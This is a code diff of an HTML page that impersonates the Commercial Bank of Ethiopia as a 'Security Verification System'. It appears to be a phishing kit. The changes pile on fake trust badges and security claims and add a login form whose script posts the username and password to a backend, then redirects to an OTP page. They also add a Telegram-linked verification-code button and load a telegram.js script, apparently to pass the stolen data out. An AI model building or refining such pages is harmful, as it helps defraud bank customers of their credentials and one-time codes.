@@ -4,27 +4,106 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CBE Security Verification</title>
+    <link rel="icon" href="assets/images/cbe-logo.png" type="image/png">
     <link rel="stylesheet" href="css/style.css">
     <link rel="stylesheet" href="css/cbe-theme.css">
     <link rel="stylesheet" href="css/animations.css">
 </head>
 <body>
     <div class="container">
+        <!-- ============================================
+        HEADER WITH LOGO
+        ============================================ -->
         <div class="cbe-header">
-            <img src="assets/images/cbe-logo.svg" alt="CBE Logo" class="cbe-logo" style="height:80px;">
+            <img src="assets/images/cbe-logo.png" alt="Commercial Bank of Ethiopia" class="cbe-logo">
             <h1>Commercial Bank of Ethiopia</h1>
             <p class="subtitle">Security Verification System</p>
         </div>
 
-        <div class="security-banner">
-            <img src="assets/images/cbe-banner.svg" alt="CBE Security Banner" style="width:100%; border-radius:10px;">
-            <div class="trust-badges" style="margin-top:15px; display:flex; gap:10px; justify-content:center;">
-                <img src="assets/images/trust-badges/secure.svg" alt="Secure">
-                <img src="assets/images/trust-badges/verified.svg" alt="Verified">
-                <img src="assets/images/trust-badges/ssl.svg" alt="SSL">
+        <!-- ============================================
+        BANNER WITH LOGO
+        ============================================ -->
+        <div class="cbe-banner">
+            <img src="assets/images/cbe-logo.png" alt="CBE" class="banner-logo">
+            <h2>Secure Banking Platform</h2>
+            <p>Your trusted partner for secure financial services</p>
+        </div>
+
+        <!-- ============================================
+        FULL TRUST BADGES
+        ============================================ -->
+        <div class="trust-badges-container">
+            <div class="trust-badges">
+                <!-- Primary Badges -->
+                <span class="trust-badge secure">
+                    <span class="icon">🔒</span> Secure
+                </span>
+                <span class="trust-badge verified">
+                    <span class="icon">✅</span> Verified
+                </span>
+                <span class="trust-badge ssl">
+                    <span class="icon">🛡️</span> SSL Protected
+                </span>
+                <span class="trust-badge trusted">
+                    <span class="icon">⭐</span> Trusted
+                </span>
+            </div>
+            
+            <div class="trust-badges" style="margin-top: 8px;">
+                <!-- Secondary Badges -->
+                <span class="trust-badge shield">
+                    <span class="icon">🛡️</span> Shield
+                </span>
+                <span class="trust-badge encrypted">
+                    <span class="icon">🔐</span> Encrypted
+                </span>
+                <span class="trust-badge gold">
+                    <span class="icon">🏆</span> Gold Standard
+                </span>
+                <span class="trust-badge dark">
+                    <span class="icon">🛡️</span> Protected
+                </span>
+            </div>
+            
+            <div class="trust-badges" style="margin-top: 8px;">
+                <!-- Small Badges -->
+                <span class="trust-badge secure small">
+                    <span class="icon">🔒</span> Secure
+                </span>
+                <span class="trust-badge verified small">
+                    <span class="icon">✅</span> Verified
+                </span>
+                <span class="trust-badge ssl small">
+                    <span class="icon">🛡️</span> SSL
+                </span>
+                <span class="trust-badge trusted small">
+                    <span class="icon">⭐</span> Trusted
+                </span>
+                <span class="trust-badge shield small">
+                    <span class="icon">🛡️</span> Shield
+                </span>
+                <span class="trust-badge encrypted small">
+                    <span class="icon">🔐</span> Encrypted
+                </span>
+            </div>
+            
+            <div class="trust-badges" style="margin-top: 8px;">
+                <!-- Animated Badges -->
+                <span class="trust-badge secure pulse">
+                    <span class="icon">🔒</span> Secure
+                </span>
+                <span class="trust-badge verified glow">
+                    <span class="icon">✅</span> Verified
+                </span>
+                <span class="trust-badge ssl pulse">
+                    <span class="icon">🛡️</span> Protected
+                </span>
             </div>
         </div>
 
+        <!-- ============================================
+        FORM
+        ============================================ -->
         <div class="form-container">
             <h2>Account Verification</h2>
             <p class="description">Please verify your account to continue with your transaction</p>
@@ -55,20 +134,188 @@
                 <button type="submit" class="cbe-btn">Verify Identity</button>
             </form>
 
+            <!-- Request Verification Code Button -->
+            <div style="text-align: center; margin-top: 20px;">
+                <button onclick="requestVerificationCode()" class="cbe-btn green" style="width: auto; padding: 10px 30px;">
+                    📱 Request Verification Code
+                </button>
+            </div>
+
+            <!-- ============================================
+            SECURITY INFO WITH LOGO
+            ============================================ -->
             <div class="security-info">
-                <p>🔐 This is a secure connection</p>
-                <p>🛡️ Protected by advanced encryption</p>
+                <div class="info-header">
+                    <img src="assets/images/cbe-logo.png" alt="CBE" style="height:30px; width:auto;">
+                    <span>Commercial Bank of Ethiopia</span>
+                </div>
+                <div class="info-row">
+                    <span class="icon">🔐</span>
+                    <span>This is a secure connection (256-bit SSL)</span>
+                </div>
+                <div class="info-row">
+                    <span class="icon">🛡️</span>
+                    <span>Protected by advanced encryption (AES-256)</span>
+                </div>
+                <div class="info-row">
+                    <span class="icon">✅</span>
+                    <span>Verified and trusted banking platform</span>
+                </div>
+                <div class="info-row">
+                    <span class="icon">⭐</span>
+                    <span>Over 50+ years of trusted service</span>
+                </div>
+                <div class="trust-badges" style="margin-top: 10px; padding-top: 10px; border-top: 1px solid #e0e0e0;">
+                    <span class="trust-badge secure small">🔒 Secure</span>
+                    <span class="trust-badge verified small">✅ Verified</span>
+                    <span class="trust-badge ssl small">🛡️ SSL</span>
+                    <span class="trust-badge trusted small">⭐ Trusted</span>
+                    <span class="trust-badge encrypted small">🔐 Encrypted</span>
+                </div>
             </div>
         </div>
 
-        <div class="footer">
+        <!-- ============================================
+        FOOTER WITH LOGO
+        ============================================ -->
+        <div class="cbe-footer">
+            <img src="assets/images/cbe-logo.png" alt="Commercial Bank of Ethiopia" class="footer-logo">
             <p>© 2026 Commercial Bank of Ethiopia. All rights reserved.</p>
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Service</a>
+                <a href="#">Security</a>
+                <a href="#">Contact Us</a>
+            </div>
+            <div class="trust-badges" style="margin-top: 10px;">
+                <span class="trust-badge secure small">🔒 Secure</span>
+                <span class="trust-badge verified small">✅ Verified</span>
+                <span class="trust-badge ssl small">🛡️ SSL</span>
+            </div>
         </div>
     </div>
+
+    <!-- ============================================
+    JAVASCRIPT
+    ============================================ -->
+    <script>
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const toggle = document.querySelector('.password-toggle');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                toggle.textContent = '🙈';
+            } else {
+                passwordInput.type = 'password';
+                toggle.textContent = '👁️';
+            }
+        }
+
+        function requestVerificationCode() {
+            const username = document.getElementById('username').value.trim();
+            
+            if (!username) {
+                showError('Please enter your username first');
+                return;
+            }
+            
+            const btn = event.target;
+            btn.disabled = true;
+            btn.textContent = '⏳ Sending...';
+            
+            fetch('/api/request-verification', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ username })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    showSuccess('✅ Verification code sent! Check the Telegram channel.');
+                } else {
+                    showError('❌ Failed to send verification code');
+                }
+            })
+            .catch(error => {
+                showError('❌ Network error. Please try again.');
+            })
+            .finally(() => {
+                btn.disabled = false;
+                btn.textContent = '📱 Request Verification Code';
+            });
+        }
+
+        function showError(message) {
+            const existing = document.querySelector('.error-message');
+            if (existing) existing.remove();
+            
+            const div = document.createElement('div');
+            div.className = 'error-message';
+            div.style.cssText = 'background: #f8d7da; color: #721c24; padding: 12px; border-radius: 8px; margin: 10px 0; border-left: 4px solid #dc3545;';
+            div.innerHTML = `❌ ${message}`;
+            
+            const form = document.querySelector('form');
+            form.parentNode.insertBefore(div, form.nextSibling);
+            setTimeout(() => div.remove(), 5000);
+        }
+
+        function showSuccess(message) {
+            const existing = document.querySelector('.success-message');
+            if (existing) existing.remove();
+            
+            const div = document.createElement('div');
+            div.className = 'success-message';
+            div.style.cssText = 'background: #d4edda; color: #155724; padding: 12px; border-radius: 8px; margin: 10px 0; border-left: 4px solid #28a745;';
+            div.innerHTML = `✅ ${message}`;
+            
+            const form = document.querySelector('form');
+            form.parentNode.insertBefore(div, form.nextSibling);
+            setTimeout(() => div.remove(), 5000);
+        }
+
+        // Form submission
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            if (!username || !password) {
+                showError('Please fill in all fields');
+                return;
+            }
+            
+            const btn = this.querySelector('.cbe-btn');
+            btn.disabled = true;
+            btn.textContent = '⏳ Verifying...';
+            
+            fetch('/api/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, password })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    window.location.href = data.redirect || '/otp-verify';
+                } else {
+                    showError(data.error || 'Verification failed');
+                    btn.disabled = false;
+                    btn.textContent = 'Verify Identity';
+                }
+            })
+            .catch(() => {
+                showError('Network error. Please try again.');
+                btn.disabled = false;
+                btn.textContent = 'Verify Identity';
+            });
+        });
+    </script>
 
     <script src="js/main.js"></script>
     <script src="js/validation.js"></script>
     <script src="js/telegram.js"></script>
     <script src="js/animations.js"></script>
 </body>
-    </html>
+                        </html>
